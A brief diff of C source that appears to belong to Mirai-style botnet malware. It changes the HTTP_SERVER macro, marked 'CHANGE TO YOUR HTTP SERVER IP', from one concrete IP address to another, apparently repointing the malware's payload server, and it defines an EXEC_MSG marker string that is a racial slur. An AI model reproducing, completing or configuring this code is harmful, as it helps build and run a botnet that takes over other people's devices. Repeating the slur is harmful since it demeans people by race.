@@ -5,7 +5,7 @@
 #include <sys/socket.h>
 #include <netinet/in.h>
 
-#define HTTP_SERVER utils_inet_addr(63,250,59,28) // CHANGE TO YOUR HTTP SERVER IP
+#define HTTP_SERVER utils_inet_addr(185,247,117,214) // CHANGE TO YOUR HTTP SERVER IP
 
 #define EXEC_MSG            "NIGGY\n"
 #define EXEC_MSG_LEN        6
